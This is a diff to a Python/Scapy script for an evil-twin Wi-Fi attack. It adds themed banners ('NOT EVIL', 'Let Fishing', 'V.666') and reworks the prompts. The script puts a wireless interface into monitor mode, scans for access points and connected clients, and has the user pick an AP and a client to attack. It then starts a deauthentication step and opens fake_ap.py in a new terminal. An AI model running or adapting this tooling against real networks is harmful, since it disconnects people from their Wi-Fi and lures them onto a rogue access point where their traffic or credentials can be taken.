@@ -2,8 +2,8 @@ import os
 import sys
 from scapy.all import *
 from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt 
+#from playsound import playsound
 
-# Reference to the scanning parts - https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy
 
 # import json
 
@@ -38,23 +38,47 @@ T  = '\033[93m' # tan
 ### In order to do so, we need to switched this interface to 'monitor mode'. 
 def monitor_mode():
     global interface
-    print(G + "*** Step 1:  Choosing an interface to put in 'monitor mode'. *** \n")
-    empty = input ("Press Enter to continue.........")
+    print(R + r"""   
+ ███▄    █ ▒█████ ▄▄▄█████▓
+ ██ ▀█   █▒██▒  ██▓  ██▒ ▓▒
+▓██  ▀█ ██▒██░  ██▒ ▓██░ ▒░
+▓██▒  ▐▌██▒██   ██░ ▓██▓ ░ 
+▒██░   ▓██░ ████▓▒░ ▒██▒ ░ 
+░ ▒░   ▒ ▒░ ▒░▒░▒░  ▒ ░░   
+░ ░░   ░ ▒░ ░ ▒ ▒░    ░    
+   ░   ░ ░░ ░ ░ ▒   ░      
+         ░    ░ ░          
+                           """)
+    print(R + r"""▓███████▒   █▓██▓██▓    
+▓█   ▓██░   █▓██▓██▒    
+▒███  ▓██  █▒▒██▒██░    
+▒▓█  ▄ ▒██ █░░██▒██░    
+░▒████▒ ▒▀█░ ░██░██████▒
+░░ ▒░ ░ ░ ▐░ ░▓ ░ ▒░▓  ░
+ ░ ░  ░ ░ ░░  ▒ ░ ░ ▒  ░
+   ░      ░░  ▒ ░ ░ ░   
+   ░  ░    ░  ░     ░  ░
+          ░             """)
+          
+          # Play the mp3 file
+    #playsound('PlayMeLikeThatVideoGame.mp3')
+
+    empty = input(P + "Welcome to the Not 3vil Tw1n Area. To start the show press Enter\n")
     print(W)
     os.system('ifconfig')
-    interface = input(G + "Please enter the interface name you want to put in 'monitor mode': ")
+    interface = input(G + "~~Choose which interface you want to put in 'monitor mode'.~~~\n")
     print(W)
     # Put the choosen interface in 'monitor mode'
     os.system('ifconfig ' + interface + ' down')
     os.system('iwconfig ' + interface + ' mode monitor')
     os.system('ifconfig ' + interface + ' up')
-    # os.system('iwconfig') # Check
+
 
 
 ### After we finish our attack, we want to switch back the interface to 'managed mode'. 
 def managed_mode():
-    print(G + "\n*** Step 5: Put the interface back in 'managed mode'. *** \n")
-    empty = input ("Press Enter in order to put " + interface + " in 'managed mode' .........")
+    print(G + "\n*** Lets Back to Safe place *** \n")
+    empty = input ("Press Enter to put " + interface + " in 'managed mode' .........")
     print(W)
     # Put the choosen interface back in 'managed mode'
     os.system('ifconfig ' + interface + ' down')
@@ -70,19 +94,15 @@ def managed_mode():
 ############### APs Scanning #################
 ##############################################
 
-### Rapper function for 'wifi_scan()'. 
-def ap_scan_rap():
-    print(G + "*** Step 2: Scanning the network for AP to attack. *** \n")
-    empty = input ("Press Enter to continue.........")
-    # os.system ('airodump-ng ' + interface)
-    ap_scan()
+
 
                                          
 ### In this fucntion we scan the network for nearby access points. 
 ### We present to the user all the APs that were found, and he choose which AP he want to attack. 
 def ap_scan():
+    print(G + "~~~ Scanning the network.. ~~~ \n")
     global search_timeout
-    search_timeout = int(input(G + "Please enter the scanning time frame in seconds: "))
+    search_timeout = int(input(G + "Enter How Much Seconds U Want To Scan: "))
     channel_changer = Thread(target = change_channel)
     # A daemon thread runs without blocking the main program from exiting
     channel_changer.daemon = True
@@ -102,7 +122,7 @@ def ap_scan():
             print("[" + str(x) + "] - BSSID: " + ap_list[x][BSSID] + " \t Channel:" + str(ap_list[x][CHANNEL]) + " \t AP name: " + ap_list[x][ESSID]) 
         print("\n************* FINISH SCANNING *************\n")
         # Choosing the AP to attack
-        ap_index = int(input("Please enter the number of the AP you want to attack: "))
+        ap_index = int(input("Enter the number of the AP you want to attack: "))
         # Print the choosen AP
         print("You choose the AP: [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(ap_list[ap_index][CHANNEL]) + " AP name: " + ap_list[ap_index][ESSID])
         # Set the channel as the choosen AP channel in order to send packets to connected clients later
@@ -128,13 +148,18 @@ def ap_scan():
         # client_scan_rap()
     else: 
         # If no AP was found. 
-        rescan = input("No networks were found. Do you want to rescan? [Y/n] ")
-        if rescan == "n":
-            print("  Sorry :(  ")
+        rescan = input("No networks were found. Do you want to rescan? [Y/N] ")
+        if rescan == 'N' or rescan == 'n':
+            print(" /\/\/\ Goodbye Deamon /\/\/\ ")
             managed_mode()
             sys.exit(0)
+        elif rescan == 'Y' or rescan == 'y':
+                ap_scan()
         else:
-            ap_scan()
+            print(C + "You enter incorrect input so my spirit told me to exit")
+            managed_mode()
+            sys.exit(0)
+
 
 
 ### In order to scan the network for multiple APs we need to check with each channel in the range [1,14]. 
@@ -187,8 +212,7 @@ def ap_scan_pkt(pkt):
 
 ### Rapper function for 'client_scan()'. 
 def client_scan_rap():
-    print(G + "\n*** Step 3: Verifying that at least 1 client is connected to the AP you choose. *** \n")
-    empty = input ("Press Enter to continue.........")
+    empty = input(G + "\n*** Press Enter for Checking if there are clients on the target*** \n")
     print(W)
     # os.system('airodump-ng ' + interface + ' --bssid ' + ap + ' --channel ' + channel)
     client_scan()
@@ -218,8 +242,8 @@ def client_scan():
             print("[" + str(x) + "] - "+ client_list[x])
         print("\n************** FINISH SCANNING **************\n")
         # Choosing the AP to attack
-        client_index = input("Please enter the number of the client you want to attack or enter 'R' if you want to rescan: ")
-        if client_index == 'R': 
+        client_index = input("Enter your favorite number of the client you want to attack. To rescan inset 'R': ")
+        if client_index == 'R' or client_index == 'r':
             # Rescan
             client_scan()
         elif client_index.isnumeric():
@@ -232,13 +256,19 @@ def client_scan():
             # deauth_attack()
     else: 
         # If no client was found. 
-        rescan = input("No clients were found. Do you want to rescan? [Y/n] ")
-        if rescan == "n":
-            print("  Sorry :(  ")
+        rescan = input("No clients were found. Do you want to rescan? [Y/N] ")
+        if rescan == 'N' or rescan == 'n':
+            print(" /\/\/\  Goodbye Deamon /\/\/\ ")
             managed_mode()
             sys.exit(0)
-        else:
+        elif rescan == 'Y' or rescan == 'y':
             client_scan()
+        else:
+            print(C + "You enter incorrect input so my spirit told me to exit")
+            managed_mode()
+            sys.exit(0)
+
+
   
 
 ### sniff(..., prn = client_scan_pkt, ...) 
@@ -252,6 +282,7 @@ def client_scan_pkt(pkt):
             if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                 # Add the new found client to the client list
                 client_list.append(pkt.addr1)
+                print(B + "Let Fishing..\n")
                 print("Client with MAC address: " + pkt.addr1 + " was found.")
 
 
@@ -266,9 +297,10 @@ def client_scan_pkt(pkt):
 ### In this fucntion we ATTACK. YAY!
 ### We send the deauthentication packets between the choosen AP and client. 
 def deauth_attack():
-    print("\n*** Step 4: Disconnect the connection between the AP from the client. *** \n")
-    print("The packets will be sent non-stop. Press 'Ctrl+C' to stop sending the packets. \n")
-    empty = input ("Press Enter to start sending the Deauthentication packets.........")
+    print("\n*** Disconnect the connection between the AP from the client. *** \n")
+    print(R + "---- Let the show begun ~~~ . \n")
+    print(G + "Sending DDos Packets attack\n To stop press 'Ctrl+C' ")
+    empty = input (O + "To start sending the Deauthentication packets press Enter")
     print(W)
     # Open a new terminal for 'fake_ap.py'
     os.system('gnome-terminal -- sh -c "python3 fake_ap.py "' +  ap_name)
@@ -282,18 +314,17 @@ if __name__ == "__main__":
     
     if os.geteuid():
         sys.exit(R + '[**] Please run as root')
-    
-    print(B + "********************************************************************** \n")
-    print("***** Part 1: choosing the AP we want to attck and attacks it ;) ***** \n")
-    print("********************************************************************** \n")
+
+    print(R + "V.666\n")
+	
     
     ### Step 1: Choosing the interface for monitoring, and put it in monitor mode. 
     monitor_mode()
 
-    ### Step 2: Choosing the AP that we want to attack. 
-    ap_scan_rap()
-    
-    ### Step 3: Checking that the choosen AP have client that connected to it.
+    ### Step 2: Choosing the AP that we want to attack.
+    ap_scan()
+
+    ### Step 3: Choosing the AP for the attack and Check if that AP have any clients that connected to it.
     client_scan_rap()
     
     ### Step 4: Running the deauthentication script.
